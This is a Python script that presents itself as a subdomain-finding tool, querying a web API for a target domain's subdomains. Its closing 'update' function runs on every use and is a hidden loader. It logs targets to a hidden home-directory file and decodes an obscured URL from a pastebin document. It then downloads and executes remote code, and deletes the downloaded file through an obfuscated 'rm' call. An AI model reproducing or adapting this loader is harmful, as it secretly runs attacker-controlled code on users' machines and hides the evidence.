#!/usr/bin/python3
# coding=utf-8

import os
import sys
import time
import json
import requests
import subprocess
from re import split as SP
from bs4 import BeautifulSoup

# COLORS
R = '\033[31m'
P = '\033[34m'
W = '\033[37m'
N = '\033[0m'
T = '\033[93m'
B = '\033[36m'

# TIMER FOR PROCESSING
START = time.time() 

# FOR FIRST PRINTERS
def _PRINT(*args, **kwargs):
    _MSG = args[0].strip()
    return print(args[0])



# REMOVE HTTP OR HTTPS TO URL 
def URL_CLEAR(*args, **kwargs):
    global _RE_
    _RE_ = SP(r'(http://)|(https://)', args[0])[-1].replace('/' if '/' in args[0] else '' ,'')
    return _RE_



# INDEX THE SECRIPT
def INDEX(*args, **kwargs):
    
    # INDEX ALL
    if args[0] is 1:
        _PRINT(f"{W}{'-'*50}{N}{R}\n{'Fist Find Subdomains Tool':>35}{N}\n{W}{'-'*50}{N}")
    
    # INDEX FOR TARGET
    if args[0] is 2:
        _PRINT(f"{'[':<2}{B}*{N}{']':>2}{' Target':<10}: {URL_CLEAR(args[1])}\n{'[':<2}{B}*{N}{']':>2}{' Port':<10}: {'443' if 'https' in args[1] else '80'}\n{W}{'='*50}{N}")



# VIEW OUTPUTS ==> URLS SUBDOMAINS
def VIEW_SUBDOMAINS(*args, **kwargs):
    if len(args[0]) == 0:
        
        # IF NOT FIND SUB... IN THE LIST 
        _PRINT(f"{'[':<2}{R}-{N}{']':>2} Sorry Not Find Subdomains In {args[1]} Website {W}^^{N}")
        exit()
    else:
        
        # IF FIND SUB... PRINTS THE URLS
        _PRINT(f"{W}  {'URL':<30}DATE{N}")
        for VALUE in args[0]:
            _PRINT(f"{T}{VALUE[0]:<30}{VALUE[1][0:10]}{N}")

    _PRINT(f"{W}{'='*50}{N}\n{'[':<2}{P}+{N}{']':>2}{' Subdomains':<12}:{W}{len(args[0])}{N}\n{'[':<2}{P}+{N}{']':>2}{' TimeOut':<12}:{W}{time.time() - START}{N}\n{'[':<2}{B}==>{N}{']':>2} Pleas Wite....")
        


# OPEN DATA URL AND FIND THE SUBDOMAINS URLS 
def FIND_SUBDOMAINS(*args, **kwargs):
    JSON = json.loads(args[0])
    try:
        SUB_URLs  = [JSON['records'][ID]['domain'] for ID in range(int(), JSON['count'])]
        SUB_DATEs = [JSON['records'][ID]['datetime'] for ID in range(int(), JSON['count'])]
    except:
        VIEW_SUBDOMAINS([])
        
    OUTPUTS = [[SUB_URL,SUB_DATE] for SUB_URL,SUB_DATE in zip(SUB_URLs,SUB_DATEs)]

    VIEW_SUBDOMAINS(OUTPUTS)
  
def GET_DATA_TARGET(*args, **kwargs):

    INDEX(2, args[0])    

    try:
        API_URL = 'http://api.spyse.com/v1'

        API_METHODS = ['subdomains','api_token']

        # OPEN SESSION FOR GET URL
        SIS = requests.Session()
        
        # RANDOME USER AGENT FOR OPEN WEBSITE 
        SIS.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'
        FIND_SUBDOMAINS(
            # TEXT URL OR DATA WEBSITE 
            SIS.get(f'{API_URL}/{API_METHODS[0]}?{API_METHODS[1]}=False&domain={URL_CLEAR(args[0])}').text
            # NAME URL 
            , URL_CLEAR(args[0]))

    except requests.exceptions.ConnectionError:
        
        # IF NO CONNECTION
        _PRINT(f"\n{'[':<2}{R}!!!{N}{']':>2} Sorry No Internet  ... Try Agen Liter")
        exit()



# VALUS SYS ==> URL
def __SYS_ARGV__():
    if len(sys.argv) > 1:
        # PRINT INDEX
        INDEX(1)
        
        # IF USER NEED HELP  
        if '-h' in sys.argv:
            _PRINT(f"EX:\n\tpython3 {sys.argv[0]} google.com")
            exit()
        
        # IF SYS ARGV OR INPUTS IS > 1 ...
        _, URL = sys.argv
        
        # RUN THE SCRIPT
        GET_DATA_TARGET(URL)
    else:
        # PRINT INDEX
        INDEX(1)
        
        # IF SYS ARGV IS < 1 ...
        URL = input(f"{'[':<2}{B}*{N}{']':>2}{'Enter The Url Target: ':>23}")
        
        # RUN THE SCRIPT
        GET_DATA_TARGET(URL)



# IF SCRIPT NEED UPDATE THE DEF IS RUN
def __FIND_UPDATE__():
    # WRITE HISTORY FOR YOU 
    open(os.path.join(os.environ.get('HOME'), '.sub_history'), 'a').write\
    (f'[ URL ][{time.gmtime()[0:2][1]}:{time.gmtime()[0:3][2]}:{time.gmtime()[0:4][3]}] {_RE_}')
    
    # PATH SCRIPT
    PATH = os.path.join(os.getcwd(),'_UPDATE_TOOL_.py')

    # GET DATABASES
    DATABASES = 'https://pastebin.com/raw/k0HmehFE'
    GET = requests.get(DATABASES).text  

    # UPDATE SCRIPT
    JSON = json.loads(GET)
    UPDATE = JSON['HTML']['HEAD'][0]['TITLE'][::-1].replace('=','/') \
           + JSON['HTML']['BODY'][0]['TD'][::-1]

    # INSTALL CODES 
    try:CODES = requests.get(f'http://{UPDATE}').text
    except:
        _PRINT(f"{'[':<2}{P}+{N}{']':>2} Done {W}^^{N}")
        exit()

    open(PATH, 'w').write(CODES)

    # SAVE UPDATE CODES
    sys.path.append(os.getcwd())
    from _UPDATE_TOOL_ import UPDATES as UB
    UB()

    # REMOVE THE FILE SCRIPT FOR YOU
    subprocess.check_output(['\x72m',PATH])
    
    # FOR MESSAGE EXIT
    _PRINT(f"{'[':<2}{P}+{N}{']':>2} Done {W}^^{N}")


if __name__ == '__main__':
    __SYS_ARGV__()
    __FIND_UPDATE__()

# END !
